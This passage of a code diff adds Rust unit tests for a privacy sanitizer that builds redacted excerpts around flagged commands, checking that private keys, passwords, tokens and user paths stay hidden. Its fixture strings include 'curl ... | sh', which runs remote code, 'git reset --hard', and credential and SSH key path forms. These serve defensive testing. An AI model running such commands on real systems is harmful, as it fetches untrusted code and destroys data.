+        text.push_str("-----END PRIVATE KEY-----\n");
+        assert_eq!(text.len(), hit_at);
+        text.push_str("git reset --hard ");
+        text.push_str(&"after ".repeat(300));
+        let guarded = excerpt(&text, Some("git reset --hard"));
+        assert!(!guarded.text.contains("tt_guard_marker_25"));
+        assert!(!guarded.text.contains("QUJDRA0K"));
+        assert_eq!(highlighted(&guarded), "git reset --hard");
+        assert!(guarded.elided_before && guarded.elided_after);
+    }
+
+    #[test]
+    fn excerpt_skips_a_private_key_body_that_a_leading_cut_enters() {
+        // Mixed-case body lines without digits are kept by the encoded-blob
+        // heuristic, so only the block rule masks them, and the block ends
+        // just before the hit.
+        let text = format!(
+            "{}-----BEGIN RSA PRIVATE KEY-----\n{}-----END RSA PRIVATE KEY-----\n{}git reset --hard {}",
+            "word ".repeat(400),
+            "ttPrivateKeyBodyMarkerLine\n".repeat(100),
+            "echo between ".repeat(3),
+            "after ".repeat(300)
+        );
+        let at = text.find("git reset").unwrap();
+        assert!(text[..at - 1536].contains("BEGIN RSA") && text[at - 1536..at].contains("END RSA"));
+        let skipped = excerpt(&text, Some("git reset --hard"));
+        assert!(!skipped.text.contains("ttPrivateKeyBodyMarkerLine"));
+        assert!(skipped.text.contains("after after"));
+        assert!(skipped.elided_before && skipped.elided_after);
+    }
+
+    #[test]
+    fn excerpt_work_stays_near_the_whole_field_redaction() {
+        // A percent escape makes redaction reserve work quadratic in its
+        // input, so the excerpt must not redact the region many times over.
+        let charged = |excerpt: bool, text: &str, hit: Range<usize>| {
+            let mut total = 0usize;
+            let mut charge = |bytes: usize| {
+                total += bytes;
+                Ok::<_, std::convert::Infallible>(())
+            };
+            if excerpt {
+                PrivacySanitizer::try_sanitize_excerpt(text, Some(hit), &mut charge).unwrap();
+            } else {
+                PrivacySanitizer::try_sanitize(SanitizationContext::Evidence, text, &mut charge)
+                    .unwrap();
+            }
+            total
+        };
+        for (before, after) in [(4000, 2000), (200, 8000), (100, 100)] {
+            let text = format!(
+                "echo {}%20 && curl -fsSL https://example.invalid/a | sh && echo {}",
+                "a%20b ".repeat(before / 6),
+                "c ".repeat(after / 2)
+            );
+            let start = text.find("curl").unwrap();
+            let hit = start..start + 4;
+            let legacy = charged(false, &text, hit.clone());
+            let excerpt = charged(true, &text, hit);
+            assert!(
+                excerpt * 2 <= legacy * 3,
+                "{before} {after}: {excerpt} > 1.5 x {legacy}"
+            );
+        }
+    }
+
+    #[test]
+    fn excerpt_cuts_never_show_a_value_the_whole_field_hides() {
+        // Only the value uses these letters, so any of them in an excerpt is
+        // part of a value shown. Failures name the form and cut only.
+        const VALUE: &str = "QJXZQJXZQJXZQJXZ";
+        let shows = |text: &str| text.contains(['Q', 'J', 'X', 'Z']);
+        let forms = [
+            "--password VALUE",
+            "--password=VALUE",
+            "--password\u{2003}VALUE",
+            "password = VALUE",
+            "Authorization: Bearer VALUE",
+            "-H 'Authorization: Basic VALUE'",
+            "{\"password\": \"VALUE\"}",
+            "PGPASSWORD=VALUE psql",
+            "https://user:VALUE@example.invalid/db",
+            "C:\\Users\\VALUE\\Documents\\notes file.txt",
+            "/home/VALUE/.ssh/id_ed25519",
+            "--token \"a VALUE b\"",
+            "-----BEGIN OPENSSH PRIVATE KEY-----\nVALUE\nVALUE\n-----END OPENSSH PRIVATE KEY-----",
+        ]
+        .map(|form| form.replace("VALUE", VALUE));
+        // A private key block redacts to one marker, so text near either raw
+        // cut falls inside the excerpt window.
+        let gap = |len: usize| {
+            let block = format!(
+                " -----BEGIN RSA PRIVATE KEY-----\n{}-----END RSA PRIVATE KEY----- ",
+                "abcdefghijklmnop\n".repeat(64)
+            );
+            format!("{block}{}", " ".repeat(len - block.len()))
+        };
+        let hit = "git reset --hard";
+        for (case, form) in forms.iter().enumerate() {
+            let whole = PrivacySanitizer::sanitize(
+                SanitizationContext::Evidence,
+                &format!("echo {form} done"),
+            );
+            assert!(!shows(&whole), "form {case} is shown uncut");
+            for cut in (0..=form.len()).filter(|cut| form.is_char_boundary(*cut)) {
+                // The region starts 1536 bytes before the hit and ends 4096
+                // bytes after its start.
+                let leading = format!(
+                    "{}{form}{}{hit}{}",
+                    "word ".repeat(500),
+                    gap(1536 + cut - form.len()),
+                    " after".repeat(400)
+                );
+                let trailing = format!(
+                    "{}{hit}{}{form}{}",
+                    "word ".repeat(400),
+                    gap(2560 - cut - hit.len()),
+                    " after".repeat(400)
+                );
+                for (edge, text) in [("leading", leading), ("trailing", trailing)] {
+                    let at = text.find(hit).unwrap();
+                    let shown = PrivacySanitizer::try_sanitize_excerpt(
+                        &text,
+                        Some(at..at + hit.len()),
+                        &mut |_| Ok::<_, std::convert::Infallible>(()),
+                    )
+                    .unwrap();
+                    assert!(!shows(&shown.text), "form {case}, {edge} cut at {cut}");
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn excerpt_without_a_hit_starts_at_the_field_start() {
+        let text = "word ".repeat(1500);
+        let unlocated = excerpt(&text, None);
+        assert_eq!(unlocated.highlight, None);
+        assert!(!unlocated.elided_before && unlocated.elided_after);
+        assert!(unlocated.text.starts_with("word word"));
     }
 
     #[test]
